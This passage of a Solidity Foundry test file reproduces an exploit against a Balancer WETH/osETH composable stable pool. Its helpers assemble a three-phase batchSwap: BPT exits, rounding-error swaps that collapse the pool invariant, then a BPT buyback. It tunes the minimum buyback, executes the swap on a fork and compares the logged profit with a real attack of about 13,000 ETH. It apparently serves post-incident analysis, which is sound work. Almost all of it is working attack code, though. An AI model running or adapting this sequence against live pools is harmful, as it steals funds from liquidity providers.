        for (uint256 i = 0; i < swapCount; i++) {
            totalBptBought += bptAmounts[i];
            uint256 preInvariant = _getInvariant(bW, bO);
            supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
            uint256 preSupply = supply;
            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW; bal[1] = bO;
            scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
            if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
            else { bO += amountIn; osethCost += amountIn; }
            supply += bptAmounts[i];
            supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            storedInvariant = postInv;
        }
    }

    function test_detailedTokenBreakdown() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        uint256 remain = 67000;
        uint256 N = 30;

        // Diagnostic: compare lastStoredInvariant vs fresh _getInvariant
        (, uint256 lastStoredInvariant) = OSETH_BPT.getLastJoinExitData();
        uint256 freshInvariant = _getInvariant(realWETH, realOSETH);
        console.log("[SP] lastStoredInvariant (getLastJoinExitData):", lastStoredInvariant);
        console.log("[SP] freshInvariant (_getInvariant):", freshInvariant);
        console.log("[SP] diff (stored - fresh):", lastStoredInvariant > freshInvariant ? lastStoredInvariant - freshInvariant : 0);
        console.log("[SP] diff (fresh - stored):", freshInvariant > lastStoredInvariant ? freshInvariant - lastStoredInvariant : 0);

        // Diagnostic: yield fee that the real Balancer mints before the first swap
        // Per IBasePool.sol comment: SWAP=0, AUM=1, YIELD=2
        uint256 protocolYieldFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(2);
        console.log("[SP] protocolYieldFeePercentage (type 1):", protocolYieldFeePercentage);
        console.log("[SP] protocolSwapFeePercentage  (type 0):", protocolSwapFeePercentage);
        console.log("[SP] totalBPT:", totalBPT);
        if (freshInvariant > lastStoredInvariant && protocolYieldFeePercentage > 0) {
            uint256 delta = freshInvariant - lastStoredInvariant;
            // yieldOwnership = delta / freshInvariant * yieldFeePercentage  (FixedPoint.mulDown(divDown))
            uint256 yieldOwnership = (delta * FixedPoint.ONE / freshInvariant) * protocolYieldFeePercentage / FixedPoint.ONE;
            // yieldFeeBpt = supply * yieldOwnership / complement(yieldOwnership)
            uint256 yieldFeeBpt = totalBPT * yieldOwnership / yieldOwnership.complement();
            console.log("[SP] yieldOwnership:", yieldOwnership);
            console.log("[SP] yieldFeeBpt (pre-Phase1 minting):", yieldFeeBpt);
        } else {
            console.log("[SP] yieldFeeBpt: 0 (no yield fee or fee rate is 0)");
        }

        console.log("=== DETAILED TOKEN BREAKDOWN: remain=67000, N=30 ===");

        // Step 1: extract tokens (per-token)
        // The attacker's total BPT debt (bptSold) consists of two parts:
        //   bptSold = (actualSupply - finalSupply) + totalFeeBpt
        //   1. actualSupply - finalSupply: BPT shares genuinely redeemed from the pool
        //   2. totalFeeBpt: extra BPT cost caused by protocol fee minting inflating virtualSupply
        (uint256 wethOut, uint256 osethOut, uint256 bptSold, uint256 postStep1Supply, uint256 phase1Invariant) =
            _simulateStep1ExtractionDetailed(realWETH, realOSETH, remain, totalBPT);
        console.log("--- Step 1: Token Extraction ---");
        console.log("WETH extracted:", wethOut);
        console.log("osETH extracted:", osethOut);
        console.log("BPT sold:", bptSold);
        console.log("[SP] phase1 lastPostJoinExitInvariant:", phase1Invariant);

        // Step 2: D-collapse cycling (per-token costs)
        // Token↔token swaps do NOT update _lastPostJoinExitInvariant in the real contract
        uint256 bW = remain; uint256 bO = remain;
        console.log("--- Step 2: D-Collapse Cycling ---");
        console.log("[SP] trickAmt:", trickAmt);
        console.log("[SP] sf[0]:", sf[0]);
        console.log("[SP] sf[1]:", sf[1]);
        for (uint256 r = 0; r < N; r++) {
            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
            console.log("[SP] Round:", r);
            console.log("[SP]   bW:", bW);
            console.log("[SP]   bO:", bO);
        }
        // Pool WETH dropped from remain→bW; that difference flowed to attacker (GAIN, not cost)
        uint256 wethGainStep2 = remain - bW;
        uint256 osethGainStep2 = remain - bO;
        console.log("--- Step 2: D-Collapse Cycling ---");
        console.log("WETH gained from pool:", wethGainStep2);
        console.log("osETH gained from pool:", osethGainStep2);

        // Print pre-Phase3 internal balances (matching EXP format)
        console.log("[SP] wethInternal before Phase3:", wethOut + wethGainStep2);
        console.log("[SP] osethInternal before Phase3:", osethOut + osethGainStep2);
        console.log("[SP] postStep1Supply:", postStep1Supply);
        console.log("[SP] bW after cycling:", bW);
        console.log("[SP] bO after cycling:", bO);

        // Step 3: BPT buyback (per-token costs) - use debug version for per-step logging
        // Use minimum bptTarget = minBuyback - warmupSum - 2 to test if attack still succeeds
        // uint256 bptTarget = 11838483978630598473877;
        uint256 bptTarget = totalBPT * 10030 / 10000;
        (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
            _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply, phase1Invariant);
        console.log("--- Step 3: BPT Buyback ---");
        console.log("[SP] Phase3 WETH cost:", wethCostStep3);
        console.log("[SP] Phase3 osETH cost:", osethCostStep3);
        console.log("WETH spent on buyback:", wethCostStep3);
        console.log("osETH spent on buyback:", osethCostStep3);
        console.log("bptTarget:", bptTarget);
        console.log("BPT bought back:", bptBought);
        console.log("[SP] wethInternal after Phase3:", wethOut + wethGainStep2 - wethCostStep3);
        console.log("[SP] osethInternal after Phase3:", osethOut + osethGainStep2 - osethCostStep3);

        // Net token deltas: Phase1 extraction + Phase2 cycling gain - Phase3 buyback cost
        uint256 netWeth = wethOut + wethGainStep2 - wethCostStep3;
        uint256 netOseth = osethOut + osethGainStep2 - osethCostStep3;
        int256 netBpt = int256(bptBought) - int256(bptSold);

        console.log("=== NET TOKEN DELTAS ===");
        console.log("Net WETH (wei):", netWeth);
        console.log("Net WETH (ETH):", netWeth / 1e18);
        console.log("Net osETH (wei):", netOseth);
        console.log("Net osETH (ETH):", netOseth / 1e18);
        console.log("Net BPT (wei):", netBpt);
        console.log("Net BPT (ETH):", netBpt / 1e18);
        console.log("Total profit (ETH):", netWeth + netOseth);
        console.log("Total profit (ETH):", (netWeth + netOseth) / 1e18);

        console.log("=== REAL ATTACK COMPARISON ===");
        console.log("Real WETH:  6587.44 ETH");
        console.log("Real osETH: 6851.12 ETH");
        console.log("Real BPT:   44.15 ETH");
    }

    /// @notice Build Phase 2 trick swap steps (token↔token to collapse D).
    /// Returns a BatchSwapStep array and the post-Phase2 simulated balances.
    function _buildPhase2Steps(
        bytes32 poolId,
        uint256 initBalance,
        uint256 trickAmt,
        uint256 maxRounds
    ) internal returns (IVault.BatchSwapStep[] memory steps, uint256 finalBalW, uint256 finalBalO) {
        IVault.BatchSwapStep[] memory buffer = new IVault.BatchSwapStep[](maxRounds * 3);
        uint256 stepCount = 0;

        uint256 bW = initBalance;
        uint256 bO = initBalance;
        uint256 amount = bO;

        for (uint256 round = 0; round < maxRounds; round++) {
            // Swap 1: WETH→osETH, extract (amount - trickAmt - 1) of osETH
            uint256 out1 = amount - trickAmt - 1;
            uint256[] memory bal = new uint256[](2);
            uint256[] memory sfs = new uint256[](2);
            bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
            bal = swapMath.getAfterSwapOutBalances(bal, sfs, 0, 1, out1, amp, swapFeePercentage);
            bW = bal[0]; bO = bal[1];
            buffer[stepCount++] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: out1, userData: bytes("")
            });

            // Swap 2: WETH→osETH, extract trickAmt (precision loss trigger)
            bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
            bal = swapMath.getAfterSwapOutBalances(bal, sfs, 0, 1, trickAmt, amp, swapFeePercentage);
            bW = bal[0]; bO = bal[1];
            buffer[stepCount++] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: trickAmt, userData: bytes("")
            });

            // Swap 3: osETH→WETH, extract truncated WETH balance
            uint256 out3 = _truncateToTop2Digits(bW);
            bool swapped = false;
            for (uint256 j = 0; j < 3; j++) {
                bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
                try swapMath.getAfterSwapOutBalances(bal, sfs, 1, 0, out3, amp, swapFeePercentage)
                    returns (uint256[] memory newBal)
                {
                    bW = newBal[0]; bO = newBal[1];
                    buffer[stepCount++] = IVault.BatchSwapStep({
                        poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: out3, userData: bytes("")
                    });
                    amount = bO;
                    swapped = true;
                    break;
                } catch {
                    out3 = out3 * 9 / 10;
                }
            }
            require(swapped, "Phase2 swap3 failed");
        }

        // Trim buffer to actual step count
        steps = new IVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) steps[i] = buffer[i];
        finalBalW = bW;
        finalBalO = bO;
    }

    /// @notice Demonstrates that batchSwap reverts when Phase 3 buys back fewer BPT
    /// than Phase 1 sold — includes all 3 phases with Phase 3 deliberately insufficient.
    function test_batchSwapRevertOnInsufficientBptRepayment() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1: BPT → token exits ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2: trick swaps to collapse D ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Phase 3: ONLY warmup steps (1e4 → 1e19), deliberately insufficient ---
        // Total warmup = 1e4 + 1e7 + 1e10 + 1e13 + 1e16 + 1e19 ≈ 1.001e19 ≈ 10 BPT
        // Phase 1 sold ≈ 11,848 BPT → massive shortfall
        uint256 phase3Count = 6;
        IVault.BatchSwapStep[] memory phase3Steps = new IVault.BatchSwapStep[](phase3Count);
        uint256 warmupAmt = 1e4;
        bool useAsset0 = true;
        for (uint256 i = 0; i < phase3Count; i++) {
            phase3Steps[i] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: warmupAmt,
                userData: bytes("")
            });
            warmupAmt = warmupAmt * 1e3;
            useAsset0 = !useAsset0;
        }

        // --- Concatenate all phases ---
        uint256 totalSteps = phase1Count + phase2Steps.length + phase3Count;
        IVault.BatchSwapStep[] memory allSteps = new IVault.BatchSwapStep[](totalSteps);
        uint256 idx = 0;

        // Phase 1
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        // Phase 2
        for (uint256 i = 0; i < phase2Steps.length; i++) allSteps[idx++] = phase2Steps[i];
        // Phase 3
        for (uint256 i = 0; i < phase3Count; i++) allSteps[idx++] = phase3Steps[i];

        // Approve & setup
        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }
        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        console.log("=== batchSwap with insufficient BPT repayment ===");
        console.log("Phase 1 steps:", phase1Count);
        console.log("Phase 2 steps:", phase2Steps.length);
        console.log("Phase 3 steps (warmup only):", phase3Count);
        console.log("Test contract BPT balance:", IERC20(address(OSETH_BPT)).balanceOf(address(this)));

        // Should revert with BAL#416 (TRANSFER_FROM_FAILED):
        //   Phase 1 sells ~11,848 BPT → assetDeltas[BPT] ≈ +11,848
        //   Phase 3 buys back only ~10 BPT (warmup only) → assetDeltas[BPT] ≈ +11,838
        //   Settlement: Vault calls BPT.transferFrom(user, vault, 11838e18) → fails (user has 0 BPT)
        vm.expectRevert();
        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, allSteps, tokens, funds, limits, block.timestamp);
        console.log("Reverted with BAL#416 (TRANSFER_FROM_FAILED) as expected");
    }

    /// @notice Find the exact minimum Phase 3 BPT buyback needed for the attack to succeed.
    /// Uses queryBatchSwap to get the precise BPT delta from Phase 1+2, then compares
    /// with the attacker's bptTarget formula.
    function test_minimumPhase3Buyback() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1 steps ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2 steps ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Build Phase 1 + Phase 2 combined ---
        uint256 totalP12 = phase1Count + phase2Steps.length;
        IVault.BatchSwapStep[] memory stepsP12 = new IVault.BatchSwapStep[](totalP12);
        uint256 idx = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                stepsP12[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                stepsP12[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        for (uint256 i = 0; i < phase2Steps.length; i++) stepsP12[idx++] = phase2Steps[i];

        // Convert IERC20[] to address[] for queryBatchSwap
        address[] memory assets = new address[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) assets[i] = address(tokens[i]);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        // Query Phase 1+2 deltas
        int256[] memory deltas = VAULT.queryBatchSwap(
            IVault.SwapKind.GIVEN_OUT, stepsP12, assets, funds
        );

        int256 bptDelta = deltas[BptIndex]; // positive = user owes BPT
        console.log("=== MINIMUM PHASE 3 BUYBACK ANALYSIS ===");
        console.log("Phase 1+2 BPT delta (user owes):");
        console.logInt(bptDelta);

        // This BPT delta IS the minimum Phase 3 buyback needed
        uint256 minBuyback = uint256(bptDelta);
        console.log("Minimum Phase 3 BPT buyback:", minBuyback);

        // Compare with simulation
        (,, uint256 bptSold,,) = _simulateStep1ExtractionDetailed(balances[0], balances[2], remain, totalBPT);
        console.log("Simulation BPT sold (Phase 1):", bptSold);

        // Compare with attacker's bptTarget formula
        uint256 bptTarget = totalBPT * 10030 / 10000;
        console.log("Attacker bptTarget (actualSupply*10030/10000):", bptTarget);
        console.log("actualSupply:", totalBPT);

        // Warmup sum from _generateStep3Amounts
        uint256 warmupSum = 1e4 + 1e7 + 1e10 + 1e13 + 1e16 + 1e19;
        console.log("Phase 3 warmup sum:", warmupSum);

        // Total BPT bought = bptTarget + warmupSum + 2 (from _generateStep3Amounts)
        uint256 totalBptBought = bptTarget + warmupSum + 2;
        console.log("Total BPT bought (with warmup):", totalBptBought);

        // Margin
        console.log("=== MARGINS ===");
        console.log("Margin: bptTarget - minBuyback =");
        if (bptTarget > minBuyback) {
            console.log("  +", bptTarget - minBuyback);
        } else {
            console.log("  -", minBuyback - bptTarget);
        }
        console.log("Margin: totalBptBought - minBuyback =");
        console.log("  +", totalBptBought - minBuyback);

        // Minimum bptTarget for _generateStep3Amounts (subtract warmup overhead)
        uint256 minBptTarget = minBuyback > warmupSum + 2 ? minBuyback - warmupSum - 2 : 0;
        console.log("Minimum bptTarget for simulation:", minBptTarget);
        console.log("Actual bptTarget:", bptTarget);
        console.log("Excess bptTarget:", bptTarget - minBptTarget);
    }

    /// @notice Use queryBatchSwap to verify whether the minimum bptTarget actually
    /// settles the BPT debt. This calls the real Vault (read-only) so it captures
    /// the true assetDeltas including protocol fees and rounding.
    function test_queryBatchSwapWithMinBptTarget() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1 steps ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2 steps ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Phase 3 steps with MINIMUM bptTarget ---
        uint256 minBptTarget = 11838483978630598473877;
        (uint256[] memory step3Amounts, uint256 step3Count) = _generateStep3Amounts(minBptTarget, 20);
        uint256 phase3Count = step3Count;

        // --- Concatenate all phases ---
        uint256 totalSteps = phase1Count + phase2Steps.length + phase3Count;
        IVault.BatchSwapStep[] memory allSteps = new IVault.BatchSwapStep[](totalSteps);
        uint256 idx = 0;

        // Phase 1
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        // Phase 2
        for (uint256 i = 0; i < phase2Steps.length; i++) allSteps[idx++] = phase2Steps[i];
        // Phase 3: alternating WETH(0)/osETH(2) → BPT(1)
        bool useAsset0 = true;
        for (uint256 i = 0; i < phase3Count; i++) {
            allSteps[idx++] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: step3Amounts[i],
                userData: bytes("")
            });
            useAsset0 = !useAsset0;
        }

        // Convert IERC20[] to address[] for queryBatchSwap
        address[] memory assets = new address[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) assets[i] = address(tokens[i]);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        // Query all 3 phases together
        int256[] memory deltas = VAULT.queryBatchSwap(
            IVault.SwapKind.GIVEN_OUT, allSteps, assets, funds
        );

        console.log("=== queryBatchSwap with MINIMUM bptTarget ===");
        console.log("minBptTarget:", minBptTarget);
        console.log("Phase 3 step count:", phase3Count);
        console.log("Total steps:", totalSteps);
        console.log("--- Asset Deltas ---");
        console.log("WETH delta (index 0):");
        console.logInt(deltas[0]);
        console.log("BPT delta (index 1):");
        console.logInt(deltas[1]);
        console.log("osETH delta (index 2):");
        console.logInt(deltas[2]);

        // BPT delta > 0 means user still owes BPT → attack fails
        // BPT delta <= 0 means user has surplus BPT → attack succeeds
        if (deltas[1] > 0) {
            console.log("RESULT: Attack FAILS - user still owes BPT to Vault");
            console.log("BPT shortfall:", uint256(deltas[1]));
        } else {
            console.log("RESULT: Attack SUCCEEDS - user has BPT surplus");
            console.log("BPT surplus:", uint256(-deltas[1]));
        }

        // Now test with minBptTarget + 2 (to cover the 1 wei gap)
        uint256 minBptTargetPlus2 = minBptTarget + 2;
        (uint256[] memory step3AmountsPlus, uint256 step3CountPlus) = _generateStep3Amounts(minBptTargetPlus2, 20);

        totalSteps = phase1Count + phase2Steps.length + step3CountPlus;
        IVault.BatchSwapStep[] memory allStepsPlus = new IVault.BatchSwapStep[](totalSteps);
        idx = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                allStepsPlus[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                allStepsPlus[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        for (uint256 i = 0; i < phase2Steps.length; i++) allStepsPlus[idx++] = phase2Steps[i];
        useAsset0 = true;
        for (uint256 i = 0; i < step3CountPlus; i++) {
            allStepsPlus[idx++] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: step3AmountsPlus[i],
                userData: bytes("")
            });
            useAsset0 = !useAsset0;
        }

        int256[] memory deltasPlus = VAULT.queryBatchSwap(
            IVault.SwapKind.GIVEN_OUT, allStepsPlus, assets, funds
        );

        console.log("=== queryBatchSwap with minBptTarget + 2 ===");
        console.log("minBptTarget+2:", minBptTargetPlus2);
        console.log("BPT delta (index 1):");
        console.logInt(deltasPlus[1]);
        if (deltasPlus[1] > 0) {
            console.log("RESULT: Attack FAILS - user still owes BPT");
            console.log("BPT shortfall:", uint256(deltasPlus[1]));
        } else {
            console.log("RESULT: Attack SUCCEEDS - user has BPT surplus");
            console.log("BPT surplus:", uint256(-deltasPlus[1]));
        }
    }

    /// @notice Call real batchSwap with minimum bptTarget to confirm BAL#416 revert,
    /// then call with minBptTarget+2 to confirm success.
    function test_realBatchSwapMinBptTarget() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex();
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1 steps ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2 steps ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Phase 3 with MINIMUM bptTarget (should fail) ---
        uint256 minBptTarget = 11838483978630598473877;
        (uint256[] memory step3Amounts, uint256 step3Count) = _generateStep3Amounts(minBptTarget, 20);

        IVault.BatchSwapStep[] memory allSteps = _assembleAllSteps(
            poolId, BptIndex, wethAmounts, wethCount, osethAmounts, osethCount,
            maxSwaps, phase2Steps, step3Amounts, step3Count
        );

        // Approve tokens
        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }
        // Give test contract plenty of WETH and osETH for settlement
        deal(address(tokens[0]), address(this), 100000 ether);
        deal(address(tokens[2]), address(this), 100000 ether);

        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        console.log("=== Real batchSwap with minBptTarget (should revert BAL#416) ===");
        console.log("Test contract BPT balance:", IERC20(address(OSETH_BPT)).balanceOf(address(this)));
        vm.expectRevert();
        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, allSteps, tokens, funds, limits, block.timestamp);
        console.log("Reverted as expected (BAL#416)");

        // --- Phase 3 with minBptTarget + 2 (should succeed) ---
        uint256 minBptTargetOk = minBptTarget + 2;
        (uint256[] memory step3AmountsOk, uint256 step3CountOk) = _generateStep3Amounts(minBptTargetOk, 20);

        IVault.BatchSwapStep[] memory allStepsOk = _assembleAllSteps(
            poolId, BptIndex, wethAmounts, wethCount, osethAmounts, osethCount,
            maxSwaps, phase2Steps, step3AmountsOk, step3CountOk
        );

        console.log("=== Real batchSwap with minBptTarget+2 (should succeed) ===");
        int256[] memory result = VAULT.batchSwap(
            IVault.SwapKind.GIVEN_OUT, allStepsOk, tokens, funds, limits, block.timestamp
        );
        console.log("batchSwap SUCCEEDED");
        console.log("WETH delta:");
        console.logInt(result[0]);
        console.log("BPT delta:");
        console.logInt(result[1]);
        console.log("osETH delta:");
        console.logInt(result[2]);
    }

    /// @dev Helper to assemble Phase1 + Phase2 + Phase3 steps into one array
    function _assembleAllSteps(
        bytes32 poolId, uint256 BptIndex,
        uint256[] memory wethAmounts, uint256 wethCount,
        uint256[] memory osethAmounts, uint256 osethCount,
        uint256 maxSwaps,
        IVault.BatchSwapStep[] memory phase2Steps,
        uint256[] memory step3Amounts, uint256 step3Count
    ) internal pure returns (IVault.BatchSwapStep[] memory) {
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }
        uint256 total = phase1Count + phase2Steps.length + step3Count;
        IVault.BatchSwapStep[] memory steps = new IVault.BatchSwapStep[](total);
        uint256 idx = 0;
        // Phase 1
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                steps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                steps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        // Phase 2
        for (uint256 i = 0; i < phase2Steps.length; i++) steps[idx++] = phase2Steps[i];
        // Phase 3
        bool useAsset0 = true;
        for (uint256 i = 0; i < step3Count; i++) {
            steps[idx++] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: step3Amounts[i],
                userData: bytes("")
            });
            useAsset0 = !useAsset0;
        }
        return steps;
    }
}

